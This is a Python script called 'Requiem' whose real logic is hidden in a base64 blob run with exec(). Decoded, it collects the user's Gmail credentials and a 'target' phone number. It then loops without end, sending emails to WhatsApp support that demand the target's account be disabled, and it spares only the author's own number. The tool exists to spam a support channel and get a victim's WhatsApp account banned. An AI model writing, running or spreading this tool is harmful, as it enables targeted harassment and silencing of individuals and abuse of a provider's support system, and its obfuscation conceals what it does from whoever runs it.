import marshal, zlib, os, sys
# sla se base64 vem pré-instala, lmfao
#Script Name: Requiem
try:
	import base64
except:
	os.system("pip install base64")
	import base64

b = (base64.b64decode('''Z2xvYmFsIFIsQixDLFksRyxSVCxDWSxDTwpDTz0nXDAzM1ttJztSPSdcMDMzWzE7MzFtJztCPSdcMDMzWzE7MzRtJztDPSdcMDMzWzE7MzdtJztDWT0nXDAzM1sxOzM2bSc7WT0nXDAzM1sxOzMzbSc7Rz0nXDAzM1sxOzMybSc7UlQ9J1wwMzNbOzBtJztOT19GT1JNQVQ9IlwwMzNbMG0iO0NfR1JFWTg5PSJcMDMzWzM4OzU7MjU0bSI7Q19SRUQxPSJcMDMzWzQ4OzU7MTk2bSIKaW1wb3J0IHNtdHBsaWIsIG9zLCBzeXMKZGVmIGxpbmsoKToKCW9zLnN5c3RlbSgidGVybXV4LW9wZW4tdXJsIGh0dHBzOi8vbXlhY2NvdW50Lmdvb2dsZS5jb20vbGVzc3NlY3VyZWFwcHM/cGxpPTEmcmFwdD1BRWpITDRPU2dnallPZ3Q4ZzhIYmdTVTU4THBVcVE1R3NENjNpcEVOcWE4NFllZ01IaW9ucXF2SVhNTW9jNGJxdS1DMEdIME4tLUthbF9BRnBkNXJSSll5TzBnLXkxQWJFUSIpCiMgaHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy41L2xpYnJhcnkvc210cGxpYi5odG1sCiMgaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL2EvMjc1MTU4MzMvMjY4NDMwNApkZWYgcmVzdGFydCgpOgogICAgcHl0aG9uID0gc3lzLmV4ZWN1dGFibGU7b3MuZXhlY2wocHl0aG9uLCBweXRob24sICpzeXMuYXJndikKCmRlZiBjbGVhcigpOgoJb3Muc3lzdGVtKCJjbGVhciIpCgkKdHJ5OgoJaW1wb3J0IHB5ZmlnbGV0CmV4Y2VwdDoKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcHlmaWdsZXQiKTtyZXN0YXJ0KCkKcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiS2lueSIsIGZvbnQgPSAiY29zbWljIiApO2NsZWFyKCk7cHJpbnQoZicnJ3tDfXtHfQp7cmVzdWx0fQouLi5gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLitzcysvL29zczpgCiAgICAgICAgICAgICAgICAgICAgICAgICBgOm95Ky0gICAgICAgYDpzcysuCiAgICAgICAgICAgICAgICAgICAgICBgL3NzL2AgICAgICAgICAgICAgIC1veW8tCiAgICAgICAgICAgICAgICAgICAtK3lvOiAgICAgICAgICAgICAgICAgICAgIGAveXMvYAogICAgICAgICAgICAgICBgOnN5Ky4gICAgICAgICAgICAgICAgICAgICAgICAgICBgOnN5Ky4KICAgICAgICAgICAgYC9zcy9gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0reW8rCiAgICAgICAgICAgLWgvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAueXNgCiAgICAgICAgICBgbS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLStzc2RvCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOnNkTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgL3ltTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuK2hOTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAtb2ROTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICA6c2ROTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgK21OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBzTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTk55YHl5Tk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTmgtLjpzTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OaGArTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICBoTk5OeSAgYC4vbU5OTk5OTk5OTk5OTk5kCiAgICAgICAgICBgbS4gICAgICAgICAgICAgICAgICAgICBoTk5OTmR5eS0gZE5OTk5OaG1OTk5OTk5zCiAgICAgICAgICAgOmQ6ICAgICAgICAgICAgICAgICAgICBoTk5OTk5taC4vTk5teS8tK21OTk5OTnlgCiAgICAgICAgICAgIGAreXM6YCAgICAgICAgICAgICAgICBoTk5OaGBgIHlOTk5vb2ROTk5OTm15OgogICAgICAgICAgICAgICBgL3l5Ly4gICAgICAgICAgICAgaE5OTk5taC9tTk5OTk5OTk5kby0KICAgICAgICAgICAgICAgICAgYDpzeW8tICAgICAgICAgIGhOTk5OTk5OTk5OTk5OaCsuCiAgICAgICAgICAgICAgICAgICAgICAuK3lzOmAgICAgICBoTk5OTk5OTk5ObXMvYAogICAgICAgICAgICAgICAgICAgICAgICAgYC9zeSsuICAgeU5OTk5OTmRvLQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1veW8vK21ObXkvLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAtOjo6CntDfVxue0N9e0d9Q29kZWQgQnk6e0N9IEtpbnlcbntDfVt7Un0qe0N9XSBBdGl2ZSBhIHBlcm1pc3PDo28gZGUgYmFpeGEgc2VndXJhbsOnYScnJyk7bGluaygpO2VtYWlsID0gaW5wdXQoZid7Q31be1l9R21haWx7Q31dOiAnKTtzZW5oYSA9IGlucHV0KGYne0N9W3tZfVNlbmhhIChOw6NvIHNlIHByZW9jdXBlLCBuw6NvIHRlbW9zIGFjZXNzbyDDoCBzdWEgc2VuaGEpe0N9XTogJyk7bnVtZXJvID0gaW5wdXQoZid7Q31be1l9TnVtZXJvIGRvIEFsdm8gKGV4OiA1NSAyMSA5KioqKioqKiope0N9XTogJykKaWYgIis1NSAyMSA3OTE4LTA1MzMiIGluIG51bWVybzoKCWV4aXQoKQplbGlmICIrNTUgMjEgNzkxODA1MzMiIGluIG51bWVybzoKCWV4aXQoKQplbGlmICI1NSAyMSA3OTE4MDUzMzMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiNTUgMjEgNzkxOC0wNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiKzU1MjE3OTE4LTA1MzMiIGluIG51bWVybzoKCWV4aXQoKQplbGlmICIrNTUyMTc5MTgwNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiNTUyMTc5MTgwNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiNTUyMTc5MTgtMDUzMyIgaW4gbnVtZXJvOgoJZXhpdCgpCnByaW50KGYie0N9W3tSfSp7Q31dIEVOVklBTkRPIERFTsOaTkNJQVMhXG5Vc2Uge0N9e1J9Q1RSTCBDe0N9IHBhcmEgcGFyYXIgbyBzY3JpcHQuXG5TZSBxdWlzZXIgZXhlY3V0YXIgZGVub3ZvLCBkaWdpdGUge0N9e0d9cHl0aG9uMyBtYWluLnB5e0N9Llxue0N9W3tZfUF2aXNve0N9XSBTZSBvIFN1cG9ydGUgcGVkaXIgdmVyaWZpY2HDp8OjbywgZGVudW5jaWUgbyBuw7ptZXJvIG1hbnVhbG1lbnRlKG9ww6dhbyBkZSBEZW51bmNpYXIgQ29udGF0bykgZSBkZXBvaXMgZmHDp2EgbyBTUEFNIG5vdmFtZW50ZSB1c2FuZG8gb3V0cm8gZW1haWwuIikKd2hpbGUgVHJ1ZToKCXRyeToKCQlnbWFpbF91c2VyID0gJ3t9Jy5mb3JtYXQoZW1haWwpO2dtYWlsX3Bhc3N3b3JkID0gJ3t9Jy5mb3JtYXQoc2VuaGEpO3NlbnRfZnJvbSA9IGdtYWlsX3VzZXI7dG8gPSBbJ3N1cHBvcnRAc3VwcG9ydC53aGF0c2FwcC5jb20nXTtzdWJqZWN0ID0gJ0Rlc2F0aXZlIGVzdGUgbnVtZXJvJztib2R5ID0gJ0Rlc2F0aXZlIGVzdGEgY29udGEgdXJnZW50ZW1lbnRlOiB7fScuZm9ybWF0KG51bWVybyk7ZW1haWxfdGV4dCA9IiIiXApGcm9tOiAlcwpUbzogJXMKU3ViamVjdDogJXMKJXMKCQkiIiIgJSAoc2VudF9mcm9tLCAiLCAiLmpvaW4odG8pLCBzdWJqZWN0LCBib2R5KTtzZXJ2ZXIgPSBzbXRwbGliLlNNVFBfU1NMKCdzbXRwLmdtYWlsLmNvbScsIDQ2NSk7c2VydmVyLmVobG8oKTtzZXJ2ZXIubG9naW4oZ21haWxfdXNlciwgZ21haWxfcGFzc3dvcmQpO3NlcnZlci5zZW5kbWFpbChzZW50X2Zyb20sIHRvLCBlbWFpbF90ZXh0KTtzZXJ2ZXIuY2xvc2UoKQoJZXhjZXB0OgoJCXByaW50KGYie0N9W3tSfUVSUk9Se0N9XSBQZXJtaXNzYW8gbmFvIGdhcmFudGlkYSBvdSBzZW5oYSBlIGVtYWlsIGludmFsaWRvKHMpLiIpO2V4aXQoKQo='''))
exec(b)
